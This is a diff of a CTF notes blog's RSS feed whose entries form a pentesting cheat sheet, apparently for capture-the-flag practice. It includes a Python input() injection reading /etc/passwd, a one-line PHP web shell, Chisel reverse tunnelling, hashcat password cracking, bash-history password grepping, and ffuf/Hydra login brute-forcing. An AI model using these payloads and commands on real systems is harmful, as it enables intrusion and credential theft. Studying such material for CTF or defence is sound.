@@ -11,10 +11,10 @@
         
         <item>
             <title>Python</title>
-            <link>https://53ctf.github.io/posts/2023/01/python/</link>
+            <link>https://53ctf.github.io/posts/python/</link>
             <pubDate>Sat, 07 Jan 2023 18:04:11 +0530</pubDate>
             
-            <guid>https://53ctf.github.io/posts/2023/01/python/</guid>
+            <guid>https://53ctf.github.io/posts/python/</guid>
             <description>Take Advantage Of input() Function And Run System Commands Within It
 __import__(&amp;#39;os&amp;#39;).system(&amp;#39;cat /etc/passwd&amp;#39;) Easy SSTI Payloads Generator
 GitHub Source
@@ -69,104 +69,104 @@ GitHub Source
         </item>
         
         <item>
-            <title>Linux Notes</title>
-            <link>https://53ctf.github.io/posts/2023/01/linux-notes/</link>
+            <title>Linux</title>
+            <link>https://53ctf.github.io/posts/linux/</link>
             <pubDate>Sat, 07 Jan 2023 09:33:57 +0530</pubDate>
             
-            <guid>https://53ctf.github.io/posts/2023/01/linux-notes/</guid>
+            <guid>https://53ctf.github.io/posts/linux/</guid>
             <description>View Cron Jobs crontab -l List Scheduled Processes/Tasks/Scripts systemctl list-timers View NFS (Network File Share) showmount REMOTE_IP -e Mount NFS mount -t nfs REMOTE_IP:/PATH/TO/NFS/SHARE /LOCAL/PATH/TO/MOUNT Crack ZIP Files fcrackzip -u -D -p /PATH/TO/WORDLIST ZIP_FILE Find SUID Binaries find / -type f -perm -4000 2&amp;gt;/dev/null PHP WebShell &amp;lt;?php system($_REQUEST[&amp;#39;cmd&amp;#39;]); ?&amp;gt; SMB Shares smbmap -H REMOTE_IP -u USERNAME Basic Chisel Port Forwarding Server ./chisel server --reverse --port LOCAL_PORT Client ./chisel client -v LOCAL_IP:LOCAL_PORT R:REMOTE_PORT:REMOTE_IP:REMOTE_PORT Find Open Ports netstat -tupln OS/Kernel Information uname -a cat /proc/version cat /etc/issue CPU Information lscpu Identifying the Network Route route ip route Discover Other IP Address On A Network arp -a ip neigh Look For A Specific String In The File System grep --color=auto -rnw &amp;#39;/&amp;#39; -ie &amp;#34;STRING_THAT_WANT_BE_FOUND&amp;#34; --color=always 2&amp;gt; /dev/null find .</description>
             <content type="html"><![CDATA[<h3 id="view-cron-jobs">View Cron Jobs</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crontab -l
-</span></span></code></pre></div><h3 id="list-scheduled-processestasksscripts">List Scheduled Processes/Tasks/Scripts</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>systemctl list-timers
-</span></span></code></pre></div><h3 id="view-nfs-network-file-share">View NFS (Network File Share)</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>showmount REMOTE_IP -e
-</span></span></code></pre></div><h3 id="mount-nfs">Mount NFS</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mount -t nfs REMOTE_IP:/PATH/TO/NFS/SHARE /LOCAL/PATH/TO/MOUNT
-</span></span></code></pre></div><h3 id="crack-zip-files">Crack ZIP Files</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>fcrackzip -u -D -p /PATH/TO/WORDLIST ZIP_FILE
-</span></span></code></pre></div><h3 id="find-suid-binaries">Find SUID Binaries</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -type f -perm -4000 2&gt;/dev/null
-</span></span></code></pre></div><h3 id="php-webshell">PHP WebShell</h3>
+<pre tabindex="0"><code>crontab -l
+</code></pre><h3 id="list-scheduled-processestasksscripts">List Scheduled Processes/Tasks/Scripts</h3>
+<pre tabindex="0"><code>systemctl list-timers
+</code></pre><h3 id="view-nfs-network-file-share">View NFS (Network File Share)</h3>
+<pre tabindex="0"><code>showmount REMOTE_IP -e
+</code></pre><h3 id="mount-nfs">Mount NFS</h3>
+<pre tabindex="0"><code>mount -t nfs REMOTE_IP:/PATH/TO/NFS/SHARE /LOCAL/PATH/TO/MOUNT
+</code></pre><h3 id="crack-zip-files">Crack ZIP Files</h3>
+<pre tabindex="0"><code>fcrackzip -u -D -p /PATH/TO/WORDLIST ZIP_FILE
+</code></pre><h3 id="find-suid-binaries">Find SUID Binaries</h3>
+<pre tabindex="0"><code>find / -type f -perm -4000 2&gt;/dev/null
+</code></pre><h3 id="php-webshell">PHP WebShell</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
 </span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">system</span>($_REQUEST[<span style="color:#e6db74">&#39;cmd&#39;</span>]);
 </span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
 </span></span></span></code></pre></div><h3 id="smb-shares">SMB Shares</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbmap -H REMOTE_IP -u USERNAME
-</span></span></code></pre></div><h3 id="basic-chisel-port-forwarding">Basic Chisel Port Forwarding</h3>
+<pre tabindex="0"><code>smbmap -H REMOTE_IP -u USERNAME
+</code></pre><h3 id="basic-chisel-port-forwarding">Basic Chisel Port Forwarding</h3>
 <h4 id="server">Server</h4>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./chisel server --reverse --port LOCAL_PORT
-</span></span></code></pre></div><h4 id="client">Client</h4>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./chisel client -v LOCAL_IP:LOCAL_PORT R:REMOTE_PORT:REMOTE_IP:REMOTE_PORT
-</span></span></code></pre></div><h3 id="find-open-ports">Find Open Ports</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>netstat -tupln
-</span></span></code></pre></div><h3 id="oskernel-information">OS/Kernel Information</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>uname -a
-</span></span><span style="display:flex;"><span>cat /proc/version
-</span></span><span style="display:flex;"><span>cat /etc/issue
-</span></span></code></pre></div><h3 id="cpu-information">CPU Information</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>lscpu
-</span></span></code></pre></div><h3 id="identifying-the-network-route">Identifying the Network Route</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>route
-</span></span><span style="display:flex;"><span>ip route
-</span></span></code></pre></div><h3 id="discover-other-ip-address-on-a-network">Discover Other IP Address On A Network</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>arp -a
-</span></span><span style="display:flex;"><span>ip neigh
-</span></span></code></pre></div><h3 id="look-for-a-specific-string-in-the-file-system">Look For A Specific String In The File System</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>grep --color<span style="color:#f92672">=</span>auto -rnw <span style="color:#e6db74">&#39;/&#39;</span> -ie <span style="color:#e6db74">&#34;STRING_THAT_WANT_BE_FOUND&#34;</span> --color<span style="color:#f92672">=</span>always 2&gt; /dev/null
-</span></span><span style="display:flex;"><span>find . -type f -exec grep -i -I <span style="color:#e6db74">&#34;STRING_THAT_WANT_BE_FOUND&#34;</span> <span style="color:#f92672">{}</span> /dev/null <span style="color:#ae81ff">\;</span>
-</span></span></code></pre></div><h3 id="find-passwords-in-history">Find Passwords in History</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat ~/.bash_history | grep -i passw
-</span></span></code></pre></div><h3 id="cracking-linuxbcrypt-password">Cracking Linux(bcrypt) Password</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>unshadow PASSWD_FILE SHADOW_FILE &gt; unshadowed.txt
-</span></span><span style="display:flex;"><span>hashcat -m <span style="color:#ae81ff">1800</span> unshadowed.txt /PATH/TO/WORDLIST -O
-</span></span></code></pre></div><h3 id="nslookup">NSLookup</h3>
+<pre tabindex="0"><code>./chisel server --reverse --port LOCAL_PORT
+</code></pre><h4 id="client">Client</h4>
+<pre tabindex="0"><code>./chisel client -v LOCAL_IP:LOCAL_PORT R:REMOTE_PORT:REMOTE_IP:REMOTE_PORT
+</code></pre><h3 id="find-open-ports">Find Open Ports</h3>
+<pre tabindex="0"><code>netstat -tupln
+</code></pre><h3 id="oskernel-information">OS/Kernel Information</h3>
+<pre tabindex="0"><code>uname -a
+cat /proc/version
+cat /etc/issue
+</code></pre><h3 id="cpu-information">CPU Information</h3>
+<pre tabindex="0"><code>lscpu
+</code></pre><h3 id="identifying-the-network-route">Identifying the Network Route</h3>
+<pre tabindex="0"><code>route
+ip route
+</code></pre><h3 id="discover-other-ip-address-on-a-network">Discover Other IP Address On A Network</h3>
+<pre tabindex="0"><code>arp -a
+ip neigh
+</code></pre><h3 id="look-for-a-specific-string-in-the-file-system">Look For A Specific String In The File System</h3>
+<pre tabindex="0"><code>grep --color=auto -rnw &#39;/&#39; -ie &#34;STRING_THAT_WANT_BE_FOUND&#34; --color=always 2&gt; /dev/null
+find . -type f -exec grep -i -I &#34;STRING_THAT_WANT_BE_FOUND&#34; {} /dev/null \;
+</code></pre><h3 id="find-passwords-in-history">Find Passwords in History</h3>
+<pre tabindex="0"><code>cat ~/.bash_history | grep -i passw
+</code></pre><h3 id="cracking-linuxbcrypt-password">Cracking Linux(bcrypt) Password</h3>
+<pre tabindex="0"><code>unshadow PASSWD_FILE SHADOW_FILE &gt; unshadowed.txt
+hashcat -m 1800 unshadowed.txt /PATH/TO/WORDLIST -O
+</code></pre><h3 id="nslookup">NSLookup</h3>
 <p>nslookup is a network administration command-line tool for querying the Domain Name System to obtain the mapping between the domain name and IP address or other DNS records.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nslookup -type<span style="color:#f92672">=</span>any DOMAIN.COM
-</span></span></code></pre></div><h3 id="dnsrecon">DNSRecon</h3>
+<pre tabindex="0"><code>nslookup -type=any DOMAIN.COM
+</code></pre><h3 id="dnsrecon">DNSRecon</h3>
 <p>DNSRecon is a Python script that provides the ability to perform: Check all NS Records for Zone Transfers. Enumerate General DNS Records for a given Domain (MX, SOA, NS, A, AAAA, SPF, and TXT). Perform common SRV Record Enumeration. Top Level Domain (TLD) Expansion.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dnsrecon -d DOMAIN.COM -D /PATH/TO/SUBDMAIN/WORDLIST -t brt
-</span></span></code></pre></div><h3 id="git-dumper">Git-Dumper</h3>
+<pre tabindex="0"><code>dnsrecon -d DOMAIN.COM -D /PATH/TO/SUBDMAIN/WORDLIST -t brt
+</code></pre><h3 id="git-dumper">Git-Dumper</h3>
 <p>A tool to dump a git repository from a website.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git-dumper http://SITENAME.COM/.git
-</span></span></code></pre></div><h3 id="ldapsearch">LDAPSearch</h3>
+<pre tabindex="0"><code>git-dumper http://SITENAME.COM/.git
+</code></pre><h3 id="ldapsearch">LDAPSearch</h3>
 <p>LDAPSearch is a shell-accessible interface to the ldap_search_ext(3) library call.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ldapsearch -D binddn<span style="color:#ae81ff">\\</span>ldap -H ldap://REMOTE_IP -w <span style="color:#e6db74">&#39;PASSWORD&#39;</span>
-</span></span><span style="display:flex;"><span>ldapsearch -D binddn<span style="color:#ae81ff">\\</span>ldap -H ldap://REMOTE_IP -w <span style="color:#e6db74">&#39;PASSWORD&#39;</span> | grep name: | sed <span style="color:#e6db74">&#39;s/^name: //&#39;</span> | grep -vE <span style="color:#e6db74">&#39;D|C|A|U&#39;</span> &gt; /PATH/TO/USERNAMES/WORDLIST
-</span></span></code></pre></div><h3 id="whatweb">WhatWeb</h3>
+<pre tabindex="0"><code>ldapsearch -D binddn\\ldap -H ldap://REMOTE_IP -w &#39;PASSWORD&#39;
+ldapsearch -D binddn\\ldap -H ldap://REMOTE_IP -w &#39;PASSWORD&#39; | grep name: | sed &#39;s/^name: //&#39; | grep -vE &#39;D|C|A|U&#39; &gt; /PATH/TO/USERNAMES/WORDLIST
+</code></pre><h3 id="whatweb">WhatWeb</h3>
 <p>WhatWeb identifies websites. It recognizes web technologies including content management systems (CMS), blogging platforms, statistic/analytics packages, JavaScript libraries, web servers, and embedded devices.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>whatweb https://DOMAIN/
-</span></span></code></pre></div><h3 id="arpscan">ARPScan</h3>
+<pre tabindex="0"><code>whatweb https://DOMAIN/
+</code></pre><h3 id="arpscan">ARPScan</h3>
 <p>ARP-SCAN is a command-line tool that uses the ARP protocol to discover and fingerprint IP hosts on the local network.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo arp-scan -l
-</span></span></code></pre></div><h3 id="netdiscover">NetDiscover</h3>
+<pre tabindex="0"><code>sudo arp-scan -l
+</code></pre><h3 id="netdiscover">NetDiscover</h3>
 <p>Netdiscover is an active/passive address reconnaissance tool, mainly developed for those wireless networks without a DHCP server when you are wardriving. Similar to ARP-SCAN.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo netdiscover -r IP/24
-</span></span></code></pre></div><h3 id="smbclient">SMBClient</h3>
+<pre tabindex="0"><code>sudo netdiscover -r IP/24
+</code></pre><h3 id="smbclient">SMBClient</h3>
 <p>SMBCLIENT is a client that can &rsquo;talk&rsquo; to an SMB/CIFS server. It offers an interface similar to that of the FTP program.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbclient -L <span style="color:#ae81ff">\\\\</span>REMOTE_IP<span style="color:#ae81ff">\\</span>
-</span></span></code></pre></div><h3 id="ssh">SSH</h3>
+<pre tabindex="0"><code>smbclient -L \\\\REMOTE_IP\\
+</code></pre><h3 id="ssh">SSH</h3>
 <p>OpenSSH is the premier connectivity tool for remote login with the SSH protocol.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh REMOTE_IP -o KexAlgorithms<span style="color:#f92672">=</span>+diffie-helman-group1-sha1 -c aex128-cbc
-</span></span></code></pre></div><h3 id="evil-winrm">Evil-WinRM</h3>
+<pre tabindex="0"><code>ssh REMOTE_IP -o KexAlgorithms=+diffie-helman-group1-sha1 -c aex128-cbc
+</code></pre><h3 id="evil-winrm">Evil-WinRM</h3>
 <p>This shell is the ultimate WinRM shell for hacking/pen testing. WinRM (Windows Remote Management) is the Microsoft implementation of the WS-Management Protocol.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>evil-winrm -i IP_ADDRESS -u username -p password
-</span></span></code></pre></div><h3 id="ffuf">FFUF</h3>
+<pre tabindex="0"><code>evil-winrm -i IP_ADDRESS -u username -p password
+</code></pre><h3 id="ffuf">FFUF</h3>
 <p>ffuf · Fast web fuzzer written in Go.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://www.vulnbegin.co.uk/FUZZ -H <span style="color:#e6db74">&#34;Cookie:ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnVPVEl4WVdsb2VpSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiI3NGNlM2EzYzk4YTg4ZjgwZWU2NjZjNWNhYWNlMjlhMSJ9&#34;</span> -t <span style="color:#ae81ff">1</span> -p 0.1 -mc all -fc <span style="color:#ae81ff">404</span> -c
-</span></span></code></pre></div><p>It can be also used to brute-force login forms.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -w ~/wordlists/usernames.txt -X POST -d <span style="color:#e6db74">&#34;username=FUZZ&amp;password=x&#34;</span> -t <span style="color:#ae81ff">1</span> -p 0.1 -H <span style="color:#e6db74">&#34;Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnVPVEl4WVdsb2VpSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiI3NGNlM2EzYzk4YTg4ZjgwZWU2NjZjNWNhYWNlMjlhMSJ9&#34;</span> -H <span style="color:#e6db74">&#34;Content-Type: application/x-www-form-urlencoded&#34;</span> -u http://www.vulnbegin.co.uk/cpadmin/login -fr <span style="color:#e6db74">&#39;Username is invalid&#39;</span>
-</span></span><span style="display:flex;"><span>ffuf -w ~/wordlists/passwords.txt -X POST -d <span style="color:#e6db74">&#34;username=admin&amp;password=FUZZ&#34;</span> -t <span style="color:#ae81ff">1</span> -p 0.1 -H <span style="color:#e6db74">&#34;Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnVPVEl4WVdsb2VpSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiI3NGNlM2EzYzk4YTg4ZjgwZWU2NjZjNWNhYWNlMjlhMSJ9&#34;</span> -H <span style="color:#e6db74">&#34;Content-Type: application/x-www-form-urlencoded&#34;</span> -u http://www.vulnbegin.co.uk/cpadmin/login -fr <span style="color:#e6db74">&#39;Password is invalid&#39;</span>
-</span></span></code></pre></div><p>And also for id fuzzing.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>seq <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">100</span> | ffuf -w - -t <span style="color:#ae81ff">1</span> -p 0.1 -H <span style="color:#e6db74">&#34;X-Token: 492E64385D3779BC5F040E2B19D67742&#34;</span> -H <span style="color:#e6db74">&#34;Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnVPVEl4WVdsb2VpSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiI3NGNlM2EzYzk4YTg4ZjgwZWU2NjZjNWNhYWNlMjlhMSJ9&#34;</span> -u http://server.vulnbegin.co.uk/user/FUZZ -mc all -fc <span style="color:#ae81ff">404</span>
-</span></span></code></pre></div><h3 id="crackmapexec">CrackMapExec</h3>
+<pre tabindex="0"><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://www.vulnbegin.co.uk/FUZZ -H &#34;Cookie:ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnVPVEl4WVdsb2VpSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiI3NGNlM2EzYzk4YTg4ZjgwZWU2NjZjNWNhYWNlMjlhMSJ9&#34; -t 1 -p 0.1 -mc all -fc 404 -c
+</code></pre><p>It can be also used to brute-force login forms.</p>
+<pre tabindex="0"><code>ffuf -w ~/wordlists/usernames.txt -X POST -d &#34;username=FUZZ&amp;password=x&#34; -t 1 -p 0.1 -H &#34;Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnVPVEl4WVdsb2VpSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiI3NGNlM2EzYzk4YTg4ZjgwZWU2NjZjNWNhYWNlMjlhMSJ9&#34; -H &#34;Content-Type: application/x-www-form-urlencoded&#34; -u http://www.vulnbegin.co.uk/cpadmin/login -fr &#39;Username is invalid&#39;
+ffuf -w ~/wordlists/passwords.txt -X POST -d &#34;username=admin&amp;password=FUZZ&#34; -t 1 -p 0.1 -H &#34;Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnVPVEl4WVdsb2VpSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiI3NGNlM2EzYzk4YTg4ZjgwZWU2NjZjNWNhYWNlMjlhMSJ9&#34; -H &#34;Content-Type: application/x-www-form-urlencoded&#34; -u http://www.vulnbegin.co.uk/cpadmin/login -fr &#39;Password is invalid&#39;
+</code></pre><p>And also for id fuzzing.</p>
+<pre tabindex="0"><code>seq 1 100 | ffuf -w - -t 1 -p 0.1 -H &#34;X-Token: 492E64385D3779BC5F040E2B19D67742&#34; -H &#34;Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnVPVEl4WVdsb2VpSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiI3NGNlM2EzYzk4YTg4ZjgwZWU2NjZjNWNhYWNlMjlhMSJ9&#34; -u http://server.vulnbegin.co.uk/user/FUZZ -mc all -fc 404
+</code></pre><h3 id="crackmapexec">CrackMapExec</h3>
 <p>This package is a swiss army knife for pentesting Windows/Active Directory environments.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crackmapexec winrm REMOTE_IP -u /PATH/TO/USERNAMES/WORDLIST_OR_SINGLE_USERNAME -p /PATH/TO/PASSWORDS/WORDLIST_OR_SINGLE_PASSWORD
-</span></span></code></pre></div><h3 id="hydra">Hydra</h3>
+<pre tabindex="0"><code>crackmapexec winrm REMOTE_IP -u /PATH/TO/USERNAMES/WORDLIST_OR_SINGLE_USERNAME -p /PATH/TO/PASSWORDS/WORDLIST_OR_SINGLE_PASSWORD
+</code></pre><h3 id="hydra">Hydra</h3>
 <p>Hydra is a parallelized login cracker which supports numerous protocols to attack. It is very fast and flexible, and new modules are easy to add. This tool makes it possible for researchers and security consultants to show how easy it would be to gain unauthorized access to a system remotely.</p>
 <p><strong>Brute-forcing SSH with HYDRA.</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -l USERNAME -P /PATH/TO/PASSWORD/WORDLIST ssh://REMOTE_IP:22 -t <span style="color:#ae81ff">4</span> -V
-</span></span></code></pre></div>]]></content>
+<pre tabindex="0"><code>hydra -l USERNAME -P /PATH/TO/PASSWORD/WORDLIST ssh://REMOTE_IP:22 -t 4 -V
+</code></pre>]]></content>
         </item>
         
     </channel>
